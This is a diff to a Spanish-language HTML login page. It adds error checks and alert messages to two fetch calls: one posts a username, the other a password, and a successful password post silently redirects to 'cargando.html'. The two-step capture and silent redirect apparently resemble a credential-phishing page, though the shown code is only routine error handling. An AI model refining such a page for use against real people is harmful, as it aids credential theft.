@@ -218,7 +218,13 @@
                     nombre: nombre
                 })
             })
-            .then(response => response.json())
+            .then(response => {
+                // Verifica si la respuesta es correcta
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
             .then(data => {
                 if (data.success) {
                     // Almacenar el nombre de usuario en localStorage
@@ -229,7 +235,10 @@
                     alert('Error al enviar el nombre de usuario');
                 }
             })
-            .catch(error => console.error('Error:', error));
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Ocurrió un error al enviar el nombre de usuario. Intenta de nuevo.');
+            });
         });
 
         // Lógica para manejar el segundo formulario (contraseña)
@@ -251,18 +260,25 @@
                     contra: contra
                 })
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
             .then(data => {
                 if (data.success) {
                     // Redirigir a cargando.html sin mostrar mensajes
                     window.location.href = 'cargando.html'; // Redirigir a cargando.html
                 } else {
-                    // Manejar el error si lo deseas (aquí puedes loguear en consola)
                     console.error('Error al enviar las credenciales');
+                    alert('Error al enviar las credenciales. Verifica tu usuario y contraseña.');
                 }
             })
-            .catch(error => console.error('Error:', error));
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Ocurrió un error al enviar las credenciales. Intenta de nuevo.');
+            });
         });
     </script>
 </body>
-</html>
